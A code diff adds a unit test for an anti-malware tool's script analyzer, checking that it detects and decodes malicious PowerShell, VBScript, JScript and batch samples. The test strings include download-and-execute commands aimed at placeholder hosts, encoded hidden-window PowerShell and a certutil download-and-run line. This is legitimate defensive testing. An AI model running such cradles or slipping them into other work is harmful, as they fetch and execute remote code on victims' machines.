@@ -23,6 +23,7 @@
 #include "antimal/ProcessTelemetry.h"
 #include "antimal/Report.h"
 #include "antimal/Scanner.h"
+#include "antimal/ScriptAnalyzer.h"
 #include "antimal/Screenshot.h"
 #include "antimal/ShellLinkParser.h"
 #include "antimal/Strings.h"
@@ -3598,6 +3599,183 @@ void TestShellLinkParser() {
       if (f.ruleId == "lnk.weaponized") weaponized = true;
     }
     Expect(weaponized, "LNK scan: weaponized-shortcut finding surfaced");
+  }
+}
+
+// Script analyzer: classification + malicious-pattern detection + one-layer
+// deobfuscation (PowerShell -EncodedCommand -> recovered C2). Scripts are the
+// dominant non-PE delivery format; this is the static engine catching up to
+// what the PE pipeline never sees.
+void TestScriptAnalyzer() {
+  using antimal::AnalyzeScript;
+  using antimal::ScriptAnalysis;
+  auto bytes = [](const std::string &s) {
+    return std::vector<uint8_t>(s.begin(), s.end());
+  };
+  auto has = [](const ScriptAnalysis &a, const char *id) {
+    for (const auto &f : a.findings) {
+      if (f.ruleId == id) return true;
+    }
+    return false;
+  };
+  // Standard base64 of arbitrary bytes (test-local encoder).
+  auto b64 = [](const std::vector<uint8_t> &in) {
+    static const char *t =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    std::string out;
+    size_t i = 0;
+    for (; i + 2 < in.size(); i += 3) {
+      uint32_t n = (in[i] << 16) | (in[i + 1] << 8) | in[i + 2];
+      out += t[(n >> 18) & 63];
+      out += t[(n >> 12) & 63];
+      out += t[(n >> 6) & 63];
+      out += t[n & 63];
+    }
+    if (i < in.size()) {
+      uint32_t n = in[i] << 16;
+      bool two = (i + 1 < in.size());
+      if (two) n |= in[i + 1] << 8;
+      out += t[(n >> 18) & 63];
+      out += t[(n >> 12) & 63];
+      out += two ? t[(n >> 6) & 63] : '=';
+      out += '=';
+    }
+    return out;
+  };
+  // Encode a string the way PowerShell -EncodedCommand does: UTF-16LE then b64.
+  auto psEnc = [&](const std::string &s) {
+    std::vector<uint8_t> u16;
+    for (char c : s) {
+      u16.push_back(static_cast<uint8_t>(c));
+      u16.push_back(0x00);
+    }
+    return b64(u16);
+  };
+
+  // --- PowerShell download cradle + IEX ---
+  {
+    const std::string ps =
+        "$c = New-Object Net.WebClient; IEX "
+        "($c.DownloadString('http://evil.example/a.ps1'))";
+    const auto a = AnalyzeScript(bytes(ps), ".ps1");
+    Expect(a.isScript && a.language == "powershell", "PS classified");
+    Expect(has(a, "script.download_cradle"), "PS download cradle flagged");
+    Expect(has(a, "script.iex"), "PS IEX flagged");
+  }
+
+  // --- PowerShell -EncodedCommand: decode + recover the hidden URL ---
+  {
+    const std::string inner =
+        "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/x')";
+    const std::string ps = "powershell -nop -w hidden -enc " + psEnc(inner);
+    const auto a = AnalyzeScript(bytes(ps), ".ps1");
+    Expect(has(a, "script.encoded_command"), "PS encoded command flagged");
+    bool decoded = false;
+    for (const auto &d : a.decodedCommands) {
+      if (d.find("DownloadString") != std::string::npos) decoded = true;
+    }
+    Expect(decoded, "PS encoded command decoded to inner script");
+    bool url = false;
+    for (const auto &u : a.recoveredUrls) {
+      if (u.find("evil.test") != std::string::npos) url = true;
+    }
+    Expect(url, "C2 URL recovered from the encoded command");
+  }
+
+  // --- PowerShell hidden-window / bypass execution flags ---
+  {
+    const std::string ps =
+        "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden "
+        "-Command Get-Date";
+    const auto a = AnalyzeScript(bytes(ps), ".ps1");
+    Expect(has(a, "script.hidden_execution"), "PS hidden/bypass flags flagged");
+  }
+
+  // --- VBScript: WScript.Shell exec + remote download object ---
+  {
+    const std::string vbs =
+        "Set s = CreateObject(\"WScript.Shell\")\r\n"
+        "s.Run \"cmd /c calc\", 0\r\n"
+        "Set x = CreateObject(\"MSXML2.XMLHTTP\")\r\n";
+    const auto a = AnalyzeScript(bytes(vbs), ".vbs");
+    Expect(a.language == "vbscript", "VBS classified");
+    Expect(has(a, "script.shell_exec"), "WScript.Shell .Run flagged");
+    Expect(has(a, "script.script_download"), "remote-download object flagged");
+  }
+
+  // --- JScript obfuscation: eval + fromCharCode ---
+  {
+    const std::string js =
+        "var a = eval(String.fromCharCode(97,108,101,114,116));\r\n"
+        "new ActiveXObject('WScript.Shell');";
+    const auto a = AnalyzeScript(bytes(js), ".js");
+    Expect(a.language == "jscript", "JS classified");
+    Expect(has(a, "script.obfuscation"), "JS fromCharCode/eval obfuscation flagged");
+  }
+
+  // --- Batch: certutil download/decode LOLBin ---
+  {
+    const std::string bat =
+        "@echo off\r\n"
+        "certutil -urlcache -split -f http://x.test/p.exe p.exe\r\n"
+        "start p.exe\r\n";
+    const auto a = AnalyzeScript(bytes(bat), ".bat");
+    Expect(a.language == "batch", "batch classified");
+    Expect(has(a, "script.lolbin_download"), "certutil download flagged");
+  }
+
+  // --- Benign script: classified, but no malicious findings ---
+  {
+    const std::string ps =
+        "Get-ChildItem C:\\Users | Sort-Object Name | Format-Table";
+    const auto a = AnalyzeScript(bytes(ps), ".ps1");
+    Expect(a.isScript, "benign PS still classified as a script");
+    Expect(a.findings.empty(), "benign PS has no malicious findings");
+  }
+
+  // --- Binary input is never a script ---
+  {
+    const std::vector<uint8_t> mz = {'M', 'Z', 0x90, 0x00, 0x03, 0x00, 0x00, 0x00};
+    Expect(!AnalyzeScript(mz, ".exe").isScript, "PE bytes are not a script");
+  }
+
+  // --- DecodePowerShellEncodedCommand directly ---
+  {
+    const std::string inner = "Write-Host hello";
+    const std::string dec =
+        antimal::DecodePowerShellEncodedCommand(psEnc(inner));
+    Expect(dec == inner, "DecodePowerShellEncodedCommand round-trips UTF-16LE");
+    Expect(antimal::DecodePowerShellEncodedCommand("!!!not base64!!!").empty(),
+           "invalid base64 -> empty decode");
+  }
+
+  // --- End-to-end: ScanFile routes a .ps1 by content, surfaces the encoded
+  // command finding, classifies the type, and merges the recovered C2 URL into
+  // the IOC set (this URL is invisible to the plaintext miner). ---
+  {
+    const std::string inner =
+        "IEX (New-Object Net.WebClient).DownloadString('http://c2.recovered/p')";
+    const std::string ps = "powershell -nop -w hidden -enc " + psEnc(inner);
+    const auto tmp =
+        std::filesystem::temp_directory_path() / "antimal_test_script.ps1";
+    {
+      std::ofstream os(tmp, std::ios::binary);
+      os.write(ps.data(), static_cast<std::streamsize>(ps.size()));
+    }
+    const antimal::ScanResult r = antimal::ScanFile(tmp);
+    std::error_code ec;
+    std::filesystem::remove(tmp, ec);
+    Expect(r.detectedType == "powershell", "PS scan: classified as powershell");
+    bool enc = false;
+    for (const auto &f : r.findings) {
+      if (f.ruleId == "script.encoded_command") enc = true;
+    }
+    Expect(enc, "PS scan: encoded-command finding surfaced");
+    bool url = false;
+    for (const auto &u : r.iocs.urls) {
+      if (u.find("c2.recovered") != std::string::npos) url = true;
+    }
+    Expect(url, "PS scan: deobfuscated C2 URL merged into IOC set");
   }
 }
 
@@ -7516,6 +7694,7 @@ int main() {
     TestMd5AndImphash();
     TestFileTypeId();
     TestShellLinkParser();
+    TestScriptAnalyzer();
     TestImportCapabilities();
     TestBrowserRisk();
     TestStringExtraction();
